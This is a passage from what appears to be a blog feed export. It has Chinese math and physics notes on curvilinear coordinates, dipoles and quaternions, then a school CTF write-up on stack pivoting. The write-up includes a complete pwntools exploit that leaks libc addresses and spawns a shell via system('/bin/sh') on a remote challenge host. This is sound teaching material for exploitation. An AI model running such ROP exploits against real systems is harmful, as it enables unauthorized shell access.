t)_u=\frac{1}{f}\frac{\partial t}{\partial u},\quad(\nablat)_v=\frac{1}{g}\frac{\partial t}{\partial v},\quad(\nablat)_w=\frac{1}{h}\frac{\partial t}{\partial w}\]</span></p><p>即梯度为</p><p><span class="math display">\[\nabla t=\frac{1}{f}\frac{\partial t}{\partialu}\boldsymbol{\hat{u}}+\frac{1}{g}\frac{\partial t}{\partialv}\boldsymbol{\hat{v}}+\frac{1}{h}\frac{\partial t}{\partialw}\boldsymbol{\hat{w}}\]</span></p><h3 id="散度">散度</h3><p>现在假定有一个矢量场 <spanclass="math display">\[\boldsymbol{A}(u,v,w)=A_u\boldsymbol{\hat{u}}+A_v \boldsymbol{\hat{v}}+A_w\boldsymbol{\hat{w}}\]</span></p><p>由散度定理可得，</p><p><span class="math display">\[\oint \boldsymbol{A}\cdot \mathrm{d}\boldsymbol{a}=\int \nabla \cdot\boldsymbol{A} \mathrm{d}\tau\]</span></p><p>有正交性可知，一无限小体元近似于一正方体。我们取一小体元及其表面分析，</p><figure><img src="sandu.jpg" alt="小体元" /><figcaption aria-hidden="true">小体元</figcaption></figure><p>小体元的三个边长为</p><p><span class="math display">\[\begin{align}\mathrm{d}l_u&amp;=f\mathrm{d}u\\\mathrm{d}l_v&amp;=g\mathrm{d}v\\\mathrm{d}l_w&amp;=h\mathrm{d}w\end{align}\]</span></p><p>由此易知体元体积 <spanclass="math inline">\(\mathrm{d}\tau\)</span></p><p><span class="math display">\[\mathrm{d}\tau=(fgh) \mathrm{d}u \mathrm{d}v \mathrm{d}w\]</span></p><p>和前面面元矢量</p><p><span class="math display">\[\mathrm{d}\boldsymbol{a}=-(gh)\mathrm{d}v\mathrm{d}w\]</span></p><p>则前面的通量为</p><p><span class="math display">\[\boldsymbol{A}\cdot\mathrm{d}\boldsymbol{a}=-(ghA_u)\mathrm{d}v\mathrm{d}w\]</span></p><p>由于 <span class="math inline">\(A_u,g,h\)</span> 都是关于位置 <spanclass="math inline">\((u,v,w)\)</span>的函数，因此其前后面不一样，要一起算偏微分。前后两面的通量为</p><p><span class="math display">\[\frac{\partial (ghA_u)}{\partial u}\mathrm{d}u\mathrm{d}v\mathrm{d}w=\frac{1}{fgh}\frac{\partial (ghA_u)}{\partialu}\mathrm{d}\tau\]</span></p><p>对左右、上下侧面做此操作，则可以得</p><p><span class="math display">\[\oint \boldsymbol{A}\cdot \mathrm{d}\boldsymbol{a}=\int\frac{1}{fgh}\left(\frac{\partial (ghA_u)}{\partial u}+\frac{\partial(fhA_v)}{\partial v}+\frac{\partial (fgA_w)}{\partial w}\right)\mathrm{d}\tau\]</span></p><p>那么 <span class="math inline">\(\boldsymbol{A}\)</span>的散度即为</p><p><span class="math display">\[\nabla \cdot \boldsymbol{A}=\frac{1}{fgh}\left(\frac{\partial(ghA_u)}{\partial u}+\frac{\partial (fhA_v)}{\partial v}+\frac{\partial(fgA_w)}{\partial w} \right)\]</span></p><h3 id="旋度">旋度</h3><h2 id="电偶极子">电偶极子</h2><h3 id="电偶极子在-rtheta-产生的电势电场">电偶极子在 <spanclass="math inline">\((r,\theta)\)</span> 产生的电势、电场</h3><p><span class="math display">\[\begin{align}\varphi&amp;=\frac{q}{4\pi \varepsilon_0}\left(\frac{1}{\sqrt{r^2+\frac{l^2}{4}-rl\cos\theta}}-\frac{1}{\sqrt{r^2+\frac{l^2}{4}+rl\cos\theta}}\right)\\&amp;=\frac{q}{4\pi\varepsilon_0r}\left(1+\frac{l}{2r}\cos\theta-1+\frac{l}{2r}\cos\theta\right)\\&amp;=\frac{q}{4\pi\varepsilon_0r}\cdot\frac{l\cos\theta}{r}\\&amp;=\frac{\boldsymbol{p}\cdot\boldsymbol{\hat{r}}}{4\pi\varepsilon_0r^2}\end{align}\]</span></p><p><span class="math display">\[\boldsymbol{E_r}=-\frac{\partial \varphi}{\partial r} =\frac{\boldsymbol{p}\cdot \boldsymbol{\hat{r}}}{2\pi\varepsilon_0r^3}\]</span></p><p><span class="math display">\[\begin{align}\boldsymbol{E_\theta}&amp;=-\frac{\partial \varphi}{r\partial \theta} \\&amp;=\frac{p \sin\theta}{4\pi\varepsilon_0r^3}\\&amp;=\frac{(\boldsymbol{p}\times \boldsymbol{\hat{r}})\times\boldsymbol{\hat{r}}}{4\pi\varepsilon_0r^3}=\frac{(\boldsymbol{p}\cdot\boldsymbol{\hat{r}})\boldsymbol{\hat{r}}-\boldsymbol{p}}{4\pi\varepsilon_0r^3}\end{align}\]</span></p><h3id="电偶极子在外场中能量受力受力矩">电偶极子在外场中能量、受力、受力矩</h3><p><span class="math display">\[\begin{align}E_p&amp;=-q\varphi_- +q\varphi_- \\&amp;=q(\varphi_+-\varphi_-)\\&amp;=q(\boldsymbol{l}\cdot\nabla\varphi)\\&amp;=-\boldsymbol{p}\cdot \boldsymbol{E}\end{align}\]</span></p><p><span class="math display">\[\begin{align}\boldsymbol{F}&amp;=-\nabla E_p \\&amp;=\nabla(\boldsymbol{p}\cdot\boldsymbol{E})\\&amp;=(\boldsymbol{p}\cdot\nabla)\boldsymbol{E}+\boldsymbol{p}\times (\nabla\times\boldsymbol{E})+(\boldsymbol{E}\cdot\nabla)\boldsymbol{p}+\boldsymbol{E}\times (\nabla\times\boldsymbol{p})\\&amp;=(\boldsymbol{p}\cdot \nabla)\boldsymbol{E}\end{align}\]</span></p><p>可见，若外场均匀，则合外力为零</p><p>对于受到的力矩，可以先以偶极子中点为基点</p><div class="note note-warning">            <p>下面有一个矢量图，如果使用夜晚模式可能会导致观感变差</p>          </div><!-- tikzjax-placeholder-4571484d22912add492185c91662e3de --><p><span class="math display">\[\begin{align}\boldsymbol{M&#39;}&amp;=q\left(\frac{\boldsymbol{l}}{2}\times\boldsymbol{E_+}\right)-q\left(\frac{-\boldsymbol{l}}{2}\times\boldsymbol{E_-} \right) \\&amp;=q\left(\frac{\boldsymbol{l}}{2}\times(\boldsymbol{E_+}+\boldsymbol{E_-}) \right)\\&amp;=\boldsymbol{p}\times\boldsymbol{E}\end{align}\]</span></p><p>再写成对任一点的形式</p><p><span class="math display">\[\begin{align}\boldsymbol{M}&amp;=\boldsymbol{M&#39;}+\boldsymbol{r}\times\boldsymbol{F} \\&amp;=\boldsymbol{p}\times\boldsymbol{E}+\boldsymbol{r}\times (\boldsymbol{p}\cdot\nabla)\boldsymbol{E}\end{align}\]</span></p><p>其中 <span class="math inline">\(\boldsymbol{r}\)</span>为偶极子相对于基点的位矢</p><p>可以看到的是，如果场是均匀的，那么其受外力矩就是 <spanclass="math inline">\(\boldsymbol{M}=\boldsymbol{p}\times\boldsymbol{E}\)</span></p><h2 id="四元数quaternions">四元数(quaternions)</h2><h3 id="定义">定义</h3><p><span class="math display">\[q=s+x i+y j+ z k\]</span></p><p>其中，<span class="math inline">\(i,j,k\)</span> 的运算规则同 <spanclass="math inline">\(\mathbb{R}^3\)</span> 中单位向量 <spanclass="math inline">\(\boldsymbol{i},\boldsymbol{j},\boldsymbol{k}\)</span> ，即右手螺旋法则</p><p>由</p><p><span class="math display">\[\begin{align}\boldsymbol{i} \times \boldsymbol{j}&amp;=\boldsymbol{k} \\\boldsymbol{j}\times \boldsymbol{i} &amp;=-\boldsymbol{k}\end{align}\]</span></p><p>则同理有</p><p><span class="math display">\[\begin{align}i j&amp;=k \\ j i&amp;=-k\end{align}\]</span></p><p>同时规定 <span class="math inline">\(ijk=i^2=j^2=k^2=-1\)</span></p><p>一个四元数可以记作 <spanclass="math inline">\(q=[s,\boldsymbol{v}]\)</span>，即后面的纯“虚”部可以记作一个向量 <spanclass="math inline">\(\boldsymbol{v}\)</span></p><h3 id="运算法则">运算法则</h3><h4 id="加法减法数乘">加法、减法、数乘</h4><p>形同虚数，固略</p><h4 id="乘法">乘法</h4><p>现有两个四元数</p><p><span class="math display">\[\begin{align}q_1&amp;=s_1+x_1i+y_1j +z_1k \\ q_2&amp;=s_2+x_2i+y_2j+z_2k\end{align}\]</span></p><p>则</p><p><span class="math display">\[\begin{align}q_1q_2=&amp;s_1s_2+s_2(x_1i+y_1j+z_1k)+s_1(x_2i+y_2j+z_2k)\\&amp;-x_1x_2-y_1y_2-z_1z_2\\&amp;+x_1y_2k-y_1x_2k+y_1z_2i-z_1x_2i+z_1x_2j-x_1z_2j\end{align}\]</span></p><p>最下面那个式子类似于叉乘，即</p><p><span class="math display">\[\begin{vmatrix} x_1 &amp; y_1 &amp; z_1 \\ x_2 &amp; y_2 &amp; z_2 \\ i&amp; j &amp; k \\\end{vmatrix}\]</span></p><p>将实虚部分离，可以得到</p><p><span class="math display">\[q_1q_2=[s_1s_2-\boldsymbol{v_1}\cdot \boldsymbol{v_2},s_1\boldsymbol{v_2}+s_2 \boldsymbol{v_1}+\boldsymbol{v_1}\times\boldsymbol{v_2}]\]</span></p><p>由此可以看出，四元数乘法不满足交换律</p><h4 id="数量积">数量积</h4><p><span class="math display">\[q_1\cdot q_2=s_1s_2+x_1x_2+y_1y_2+z_1z_2\]</span></p><h4 id="共轭">共轭</h4><p>若设 <span class="math inline">\(q=[s,\boldsymbol{v}]\)</span>，则它的共轭为 <spanclass="math inline">\(q^*=[s,-\boldsymbol{v}]\)</span></p><h4 id="模">模</h4><p><span class="math display">\[\begin{align}|q|&amp;=\sqrt{s^2+x^2+y^2+z^2} \\&amp;=\sqrt{s^2+\boldsymbol{v}^2}\end{align}\]</span></p><p>另</p><p><span class="math display">\[qq^*=q^*q=|q|^2\]</span></p><h4 id="单位四元数">单位四元数</h4><p><span class="math display">\[\hat{q}=\frac{q}{|q|}\]</span></p><h4 id="求逆">求逆</h4><p>定义 <span class="math inline">\(qq^{-1}=1\)</span>，则有下面推导</p><p><span class="math display">\[\begin{align}qq^{-1}&amp;=1 \\ q^*qq^{-1}&amp;=q^*\\ |q|^2q^{-1}&amp;=q^*\\q^{-1}&amp;=\frac{q^*}{|q|^2}\end{align}\]</span></p><h3 id="三维旋转">三维旋转</h3><p>类比于二维向量旋转，我们希望构造一个单位四元数 <spanclass="math inline">\(q\)</span> 使得一个三维空间中的一个向量 <spanclass="math inline">\(\boldsymbol{p}\)</span> 绕轴 <spanclass="math inline">\(\boldsymbol{\hat{v}}\)</span> 旋转 <spanclass="math inline">\(\theta\)</span> 角到 <spanclass="math inline">\(\boldsymbol{p&#39;}\)</span> ，即表达式为 <spanclass="math inline">\(p&#39;=q p\)</span> （这里 <spanclass="math inline">\(\boldsymbol{p},\boldsymbol{p&#39;}\)</span>都已被换成对应的四元数，其中实部为零）</p><p>然而事实上，这并不正确，因为</p><p><span class="math display">\[\begin{align}p&#39;&amp;=qp \\&amp;=[\cos\theta,\sin \theta\boldsymbol{\hat{v}}][0,\boldsymbol{p}]\\&amp;=[-\sin \theta\boldsymbol{p}\cdot \boldsymbol{\hat{v}},\cos\theta \boldsymbol{p}+\sin\theta \boldsymbol{\hat{v}}\times \boldsymbol{p}]\end{align}\]</span></p><p>如果 <span class="math inline">\(\boldsymbol{p}\not\perp\boldsymbol{\hat{v}}\)</span> 则 <spanclass="math inline">\(Re(p&#39;)\not=0\)</span> ，则 <spanclass="math inline">\(p&#39;\)</span> 不为纯四元数，且 <spanclass="math inline">\(|p&#39;|\not=|p|\)</span></p><p>事实上可以证明，若 <spanclass="math inline">\(\boldsymbol{p}\)</span> 绕轴 <spanclass="math inline">\(\boldsymbol{\hat{v}}\)</span> 旋转 <spanclass="math inline">\(2\theta\)</span> 到 <spanclass="math inline">\(\boldsymbol{p&#39;}\)</span> ，则需如下</p><p><span class="math display">\[\begin{align}p&#39;&amp;=qpq^{-1} \\ q^{-1}&amp;=q^{*}=[\cos\theta,\sin \theta\boldsymbol{\hat{v}}]\end{align}\]</span></p><h3 id="参考文献">参考文献</h3><p><ahref="https://www.3dgep.com/understanding-quaternions/">UnderstandingQuaternions</a></p><h2 id="tikz画图练习">tikz画图练习</h2><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\begin</span>&#123;document&#125;<br><span class="hljs-keyword">\begin</span>&#123;tikzpicture&#125;<br><span class="hljs-keyword">\draw</span>[-&gt;] (0.5,5)--(5.5,5);<br><span class="hljs-keyword">\draw</span>[-&gt;] (0.5,1)--(5.5,1);<br><span class="hljs-keyword">\draw</span>[-&gt;] (0,1.5)--(0,4.5);<br><span class="hljs-keyword">\draw</span>[-&gt;] (6,1.5)--(6,4.5);<br><span class="hljs-keyword">\node</span> at (0,1) &#123;<span class="hljs-built_in">$</span>U<span class="hljs-built_in">^</span>&#123;**&#125;<span class="hljs-built_in">$</span>&#125;;<br><span class="hljs-keyword">\node</span> at (0,5) &#123;<span class="hljs-built_in">$</span>U<span class="hljs-built_in">$</span>&#125;;<br><span class="hljs-keyword">\node</span> at (6,5) &#123;<span class="hljs-built_in">$</span>V<span class="hljs-built_in">$</span>&#125;;<br><span class="hljs-keyword">\node</span> at (6,1) &#123;<span class="hljs-built_in">$</span>V<span class="hljs-built_in">^</span>&#123;**&#125;<span class="hljs-built_in">$</span>&#125;;<br><span class="hljs-keyword">\node</span>[above] at (3,5) &#123;<span class="hljs-built_in">$</span><span class="hljs-keyword">\varphi</span><span class="hljs-built_in">$</span>&#125;;<br><span class="hljs-keyword">\node</span>[below] at (3,1) &#123;<span class="hljs-built_in">$</span><span class="hljs-keyword">\varphi</span><span class="hljs-built_in">^</span>&#123;**&#125;<span class="hljs-built_in">$</span>&#125;;<br><span class="hljs-keyword">\node</span>[left] at (0,3) &#123;<span class="hljs-built_in">$</span><span class="hljs-keyword">\eta</span><span class="hljs-built_in">_</span>U<span class="hljs-built_in">$</span>&#125;;<br><span class="hljs-keyword">\node</span>[left] at (6,3) &#123;<span class="hljs-built_in">$</span><span class="hljs-keyword">\eta</span><span class="hljs-built_in">_</span>V<span class="hljs-built_in">$</span>&#125;;<br><span class="hljs-keyword">\node</span>[right] at (0,3) &#123;<span class="hljs-built_in">$</span><span class="hljs-keyword">\sim</span><span class="hljs-built_in">$</span>&#125;;<br><span class="hljs-keyword">\node</span>[right] at (6,3) &#123;<span class="hljs-built_in">$</span><span class="hljs-keyword">\sim</span><span class="hljs-built_in">$</span>&#125;;<br><span class="hljs-keyword">\end</span>&#123;tikzpicture&#125;<br><span class="hljs-keyword">\end</span>&#123;document&#125;<br></code></pre></td></tr></table></figure><!-- tikzjax-placeholder-090e2def7886b9ad6fcfb92484b15da5 -->]]></content>
    
    
    <categories>
      
      <category>数理基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数学</tag>
      
      <tag>物理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一道校内pwn题——stack1</title>
    <link href="/2024/03/01/ucas-ctf-pwn-stack1/"/>
    <url>/2024/03/01/ucas-ctf-pwn-stack1/</url>
    
    <content type="html"><![CDATA[<p>关于栈迁移的一道题 <span id="more"></span></p><h2 id="准备步骤">准备步骤</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">checksec stack1<br><br><span class="hljs-comment">#    Arch:     amd64-64-little</span><br><span class="hljs-comment">#    RELRO:    Partial RELRO</span><br><span class="hljs-comment">#    Stack:    No canary found</span><br><span class="hljs-comment">#    NX:       NX enabled</span><br><span class="hljs-comment">#    PIE:      No PIE (0x3fe000)</span><br></code></pre></td></tr></table></figure><p>ida检查，发现漏洞，在<code>sub_400676()</code>中有16个字节的溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_400676</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">80</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h] BYREF</span><br><br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">96uLL</span>);      <span class="hljs-comment">//溢出</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>但这是64为程序，且溢出只能覆盖<code>rbp</code>和返回地址，这就导致不能一次性构造参数并调用。我们可以考虑进行<strong>栈迁移</strong>，把执行流的栈转到别的地方。</p><h2 id="栈迁移原理">栈迁移原理</h2><h3 id="条件">条件</h3><p>栈迁移主要是针对溢出长度不够，无法进行传参（比如本题只够覆盖rbp和返回地址），但需要可以覆盖到rbp以迁移栈。</p><h3 id="关键指令-leaveret">关键指令 <code>leave;ret;</code></h3><p><code>leave</code> 指令可以看成两条指令<code>mov rsp,rbp; pop rbp;</code>，可以看出这条指令原本是用来还原调用函数前的栈帧的，但如果我们提前改变<code>rbp</code>的值，譬如，改成比现在 <code>rsp</code>地址还低的位置（即栈的高处），那么在执行语句之后栈帧就在上方，可以利用之前在栈中写入的数据（题中的<code>buffer</code> ）控制程序流程了。</p><p>如果不清楚的话，可再看看这篇文章：<ahref="https://www.cnblogs.com/ZIKH26/articles/15817337.html">栈迁移的原理&amp;&amp;实战运用</a></p><h2 id="构造payload">构造payload</h2><h3 id="泄露rbp">泄露<code>rbp</code></h3><p>因为我们要修改<code>rbp</code>，所以我们要先知道原来<code>rbp</code>的值，再在其基础上进一步修改。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">1</span>))<br>payload1=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">80</span><br>conn.send(payload1)<br>old_rbp_addr=<span class="hljs-built_in">int</span>.from_bytes(conn.recv()[<span class="hljs-number">80</span>:<span class="hljs-number">86</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<span class="hljs-comment"># &gt;</span><br></code></pre></td></tr></table></figure><p>如果rbp的低位中没有<code>\x00</code>的话，puts就会将80个a和<code>rbp</code>打印出来，截取6个字符是因为64位的栈从<code>0x7f??????????</code>开始，前面有两个<code>\x00</code>字符，puts打印不出来</p><h3 id="泄露libc基址">泄露libc基址</h3><p>我们gdb一下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">gdb stack1<br>b *0x0000000000400710   <span class="hljs-comment">#这是主循环函数sub_400676()的入口</span><br>r<br>s                       <span class="hljs-comment">#单步进入函数sub_400676()</span><br>n<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs gdb">──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────<br>   0x400676    push   rbp<br> ► 0x400677    mov    rbp, rsp<br>   0x40067a    sub    rsp, 0x50<br>   0x40067e    lea    rdx, [rbp - 0x50]<br>   0x400682    mov    eax, 0<br>   0x400687    mov    ecx, 0xa<br>   0x40068c    mov    rdi, rdx<br>   0x40068f    rep stosq qword ptr [rdi], rax<br>    ↓<br>   0x40068f    rep stosq qword ptr [rdi], rax<br><br>───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────<br>00:0000│ rsp 0x7fffffffd7c0 —▸ 0x7fffffffd7e0 —▸ 0x400730 ◂— 0x41ff894156415741<br>01:0008│     0x7fffffffd7c8 —▸ 0x400715 ◂— 0xb890f0eb0274c085<br>02:0010│     0x7fffffffd7d0 —▸ 0x7fffffffd8c8 —▸ 0x7fffffffdb6f ◂— &#x27;/home/kali/ctf/pwn/q29_stack1/stack1&#x27;<br>03:0018│     0x7fffffffd7d8 ◂— 0x100000000<br>04:0020│ rbp 0x7fffffffd7e0 —▸ 0x400730 ◂— 0x41ff894156415741<br>05:0028│     0x7fffffffd7e8 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov edi, eax<br>06:0030│     0x7fffffffd7f0 ◂— 0x1<br>07:0038│     0x7fffffffd7f8 —▸ 0x7fffffffd8c8 —▸ 0x7fffffffdb6f ◂— &#x27;/home/kali/ctf/pwn/q29_stack1/stack1&#x27;<br></code></pre></td></tr></table></figure><p>其中<code>0x7fffffffd7c8</code>是新建栈帧返回地址所在，<code>0x7fffffffd7c0</code>是原来rbp地址所在，值为<code>0x7fffffffd7e0</code>再加上buffer的0x50大小，就可以计算新rbp及栈顶的位置了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">now_rbp_addr=old_rbp_addr-<span class="hljs-number">0x20</span><br>now_esp_addr=now_rbp_addr-<span class="hljs-number">0x50</span><br>return_addr2=<span class="hljs-number">0x0000000000400710</span>  <span class="hljs-comment">#call            rbp_3|  rbp_2          normal_ret</span><br>payload2=p64(now_rbp_addr)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(return_addr2)+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">0x8</span>*<span class="hljs-number">5</span>)+p64(now_esp_addr)+p64(leave_addr)<br>conn.send(payload2)<br>puts_addr=<span class="hljs-built_in">int</span>.from_bytes(conn.recvuntil(<span class="hljs-string">b&#x27;\x7f\x0a\x3e&#x27;</span>)[-<span class="hljs-number">8</span>:-<span class="hljs-number">2</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br></code></pre></td></tr></table></figure><p>这个payload将新栈帧转到原来的栈顶并执行传参和对puts的调用</p><h3 id="pwn-it">Pwn it！</h3><p>计算binsh和system真实地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">libcbase=puts_addr-puts_libc<br>abinsh_addr=libcbase+abinsh_libc<br>system_addr=libcbase+system_libc<br></code></pre></td></tr></table></figure><p>与上一步相同的方法构造新栈帧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">now_ebp_addr-=<span class="hljs-number">56</span><br>now_esp_addr=now_ebp_addr-<span class="hljs-number">0x50</span><br>payload3=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(rdi_addr)+p64(abinsh_addr)+p64(system_addr)+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">0x8</span>*<span class="hljs-number">4</span>)+p64(now_esp_addr)+p64(leave_addr) <span class="hljs-comment">#前面8个a是新的rbp，但不过这个rbp已经没用了，所以可以随便填</span><br>conn.send(payload3)<br>conn.interactive()<br></code></pre></td></tr></table></figure><h2 id="exp">exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>ip=<span class="hljs-string">&quot;124.16.75.117&quot;</span><br>port=<span class="hljs-number">51001</span><br>conn=connect(ip,port)<br><span class="hljs-comment">#conn=process(&quot;./pwn/q29_stack1/stack1&quot;)</span><br><span class="hljs-comment">#conn=gdb.debug(&#x27;./pwn/q29_stack1/stack1&#x27;,&#x27;b *0x00000000004006C4&#x27;)</span><br>libc=ELF(<span class="hljs-string">&#x27;./pwn/q29_stack1/libc.so.6&#x27;</span>)<br>puts_libc=libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_libc=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>abinsh_libc=libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br>leave_addr=<span class="hljs-number">0x00000000004006BE</span><br>rdi_addr=<span class="hljs-number">0x0000000000400793</span><br>puts_got=<span class="hljs-number">0x0000000000601020</span><br>puts_plt=<span class="hljs-number">0x0000000000400530</span><br><br><span class="hljs-comment">#***************1***************</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;111111111111111111111111&quot;</span>)<br><span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">1</span>))<br>payload1=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">80</span><br>conn.send(payload1)<br>old_ebp_addr=<span class="hljs-built_in">int</span>.from_bytes(conn.recv()[<span class="hljs-number">80</span>:<span class="hljs-number">86</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<span class="hljs-comment"># &gt; is here</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(old_ebp_addr))<br><br><span class="hljs-comment">#***************2***************</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;222222222222222222222222&quot;</span>)<br>now_ebp_addr=old_ebp_addr-<span class="hljs-number">0x20</span><br>now_esp_addr=now_ebp_addr-<span class="hljs-number">0x50</span><br>return_addr2=<span class="hljs-number">0x0000000000400710</span>  <span class="hljs-comment">#call            ebp_3|  ebp_2          normal_ret</span><br>payload2=p64(now_ebp_addr)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(return_addr2)+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">0x8</span>*<span class="hljs-number">5</span>)+p64(now_esp_addr)+p64(leave_addr)<br>conn.send(payload2)<br>puts_addr=<span class="hljs-built_in">int</span>.from_bytes(conn.recvuntil(<span class="hljs-string">b&#x27;\x7f\x0a\x3e&#x27;</span>)[-<span class="hljs-number">8</span>:-<span class="hljs-number">2</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>libcbase=puts_addr-puts_libc<br>abinsh_addr=libcbase+abinsh_libc<br>system_addr=libcbase+system_libc<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr),<span class="hljs-built_in">hex</span>(libcbase))<br><br><br><span class="hljs-comment">#****************3***************</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;33333333333333333333333&quot;</span>)<br>now_ebp_addr-=<span class="hljs-number">56</span><br>now_esp_addr=now_ebp_addr-<span class="hljs-number">0x50</span><br>payload3=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(rdi_addr)+p64(abinsh_addr)+p64(system_addr)+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">0x8</span>*<span class="hljs-number">4</span>)+p64(now_esp_addr)+p64(leave_addr)<br>conn.send(payload3)<br>conn.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf_pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>writeup</tag>
      
      <tag>pwn</tag>
      
      <tag>栈迁移</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一道校内pwn题——primecoder</title>
    <link href="/2024/02/26/ucas-ctf-pwn-primecoder/"/>
    <url>/2024/02/26/ucas-ctf-pwn-primecoder/</url>
    
